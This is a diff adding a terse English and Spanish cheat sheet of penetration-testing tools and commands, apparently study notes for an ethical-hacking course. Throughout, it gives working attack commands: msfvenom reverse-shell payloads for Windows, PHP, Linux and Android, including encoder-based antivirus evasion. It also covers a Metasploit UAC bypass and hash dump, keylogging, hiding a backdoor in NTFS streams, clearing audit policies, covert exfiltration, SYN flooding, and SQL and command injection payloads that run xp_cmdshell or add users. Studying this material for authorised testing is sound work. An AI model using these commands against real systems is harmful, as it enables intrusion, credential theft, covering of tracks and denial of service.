@@ -1,0 +1,163 @@
+FOOTPRINTING AND RECONASIANCE
+FIREBUG ADD-ON
+
+
+ENUMERATION
+GLOBAL NETWORK INVENTORY
+ADVANCED IP SCANNER 
+-----------------------------
+NETBIOS ENUMERATION
+SUPERSCAN 
+NETBIOS ENUMERATOR
+
+NULL SESSION NETBIOS
+NET USE \\IP\FOLDER ""\USER:""
+------------------------------
+SNMP 161 BRUTE FORCE
+NMAP -sU -p 161 --script=snmp-brute IP
+
+METASPLOIT ( AUXILIARY/SCANNER/SNMP/SNMP_LOGIN) ( AUXILIARY/SCANNER/SNMP/SNMP_ENUM)
+----------------------------------------------------------------------------------------
+LDAP ENUMERATION
+ACTIVE DIRECTORY EXPLORER
+-----------------------------------
+SAMBA ENUMERATION
+ENUM4LINUX
+
+
+VULNERABILITY ANALYSIS
+NESSUS
+NIKTO
+
+
+SYSTEM HACKING
+-------------------------------------
+DUMPING AND CRACKING SAM HASHES
+PWDUMP7
+OPCRACK PARA CRACKING HASHES
+-------------------------------------
+CREATING RAINBOW TABLES
+WINRTGEN (PARA CREAR TABLAS)
+RAINBOWCRACK (PARA ROMPER LOS HASHES CON LA TABLA QUE CREAMOS ARRIBA)
+-----------------------------------------------------------------------
+AUDITING SYSTEM
+LOPHTCRACK
+CREATE A VIRUS WITH MSFVENOM (msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe (optional -e x86/shikata_ga_nai -b "\x00") LHOST=IP LPORT=PORT -o RUTA)
+Iniciar msfconsole, use multi/handler , set payload windows/meterpreter/reverse_tcp 
+METERPRETER RUN VNC PARA VER EL DESKTOP DEL EQUIPO REMOTO
+-----------------------------------------------------------------------
+ESCALATE PRIVILEGE WITH METASPLOIT
+run post/windows/gather/smart_hashdump
+use exploit/windows/local/bypassuac_fodhelper // set SESSION 1 // set payload windows/meterpreter/reverse_tcp
+getsystem (para obtener high priv)
+--------------------------------------------------------------------------
+download bootmgr (descarga archivos)
+keyscan_start (Keylogger)
+SPYTECH SPYAEGENT / Power SPY
+--------------------------------------------------------------------------
+HIDING FILES USING NTFS STREAMS
+type c:\file > c:\secretfile:file
+mklink backdoor.exe secretfile:file 
+-------------------------------------------------------------------------
+HIDING FILES USING WHITE SPACE STEG
+SNOW (snow -C -m "blabla" -p "magic" secretfile secretfile2 // snow -C -p "magic" secretfile2)
+-------------------------------------------------------------------------
+IMAGE STEGANOGRAPHY
+OPENSTEGO // QuickStego
+-------------------------------------------------------------------------
+CLEARING AUDIT LOGS
+auditpol /get /category:* (ver las audit policies)
+auditpol /set /category:"system","account logon" /success:enable /failure:enable (habilitar audit policies)
+auditpol /clear /y (clear all audit policies)
+-------------------------------------------------------------------------
+COVERT_TCP ( cc -o covert_tcp covert_tcp.c) (./covert_tcp -dest IPdest -source IPsrc -source_port 00 -dest_port 11 -server -file /secretfile
+-------------------------------------------------------------------------
+THEFATRAT
+opcion 06 // opcion 03 // payload // opcion 07 // opcion 02 // BadDoc // y 
+-------------------------------------------------------------------------
+LLMNR & NETBIOS
+RESPONDER 
+responder -I tun0 // john responder_file 
+
+
+DENIAL OF SERVICE
+--------------------------------------------------------------------------
+SYN FLOODING METASPLOIT (auxiliary/dos/tcp/synflood timeout 20k) 
+HPING3 (hping3 -S IPvic -a IPatt -p 22 --flood)
+HOIC
+---------------------------------------------------------------------------
+
+SESSION HIJACKING
+ZAP Proxy (Add Break Tab // )
+
+
+HACKING WEB SERVERS
+FOOTPRINTING:
+SKIPFISH like gobuster
+httprecon tool 
+ID SERVE 
+UNISCAN -h URL -qweds
+---------------------------------------------------------------------------
+BRUTEFORCE
+HYDRA
+JOHN
+HASHCAT
+
+
+HACKING WEB APPLICATIONS
+PARAMETER TAMPERING 
+XSS (<script>alert("HELLO")</script>)
+----------------------------------------------------------------------------
+ENUMERATION
+WPSCAN (--url URL --enumerate u)
+METASPLOIT (auxiliary/scanner/http/wordpress_login_enum)
+COMMAND INJECTION ( |hostname, |net user TEST /add)
+VEGA
+ACUNETIX web scanner
+----------------------------------------------------------------------------
+FILE UPLOAD VULNERABILITY
+msfvenom -p php/meterpreter/reverse_tcp lhost=IP lport=PORT -f raw
+GUARDAR COMO PHP FILE 
+USAR BURP SUITE PARA MODIFICAR ON THE FLY LA EXTENSION DEL ARCHIVO
+-----------------------------------------------------------------------------
+CSRF
+ABRIR WP /PLUGINS/INSTALLED PLUGINS/FIREWALL2
+WPSCAN ENUMERATE VP
+-----------------------------------------------------------------------------
+
+
+SQL INJECTION
+' OR 1=1 -- (;'INSERT INTO LOGIN VALUES ('JOHN','APPLE');--)
+';exec master..xp_cmdshell'ping URL -| 65000 -t';--
+--------------------------------------------------------------
+N-STALKER X 
+owasp policy
+---------------------------------------------------------------
+CONSOLE (document.cookie)
+SQLMAP (-u url --cookie= --dbs)
+
+
+HACKING WIRELESS
+AIRCRACK-NG
+
+
+CRYPTOGRAPHY
+HASHCALC 
+CRYPTOFORGE
+BCTEXTENCODER
+VERACRYPT
+
+
+CLOUD COMPUTING
+BYPASS AV MSFVENOM linux/x86/shell/reverse_tcp -F ELF
+SLOWLORIS DoS
+
+
+MOBILE HACKING
+MSFVENOM -L (android/meterpreter/reverse_tcp)
+
+
+
+
+
+
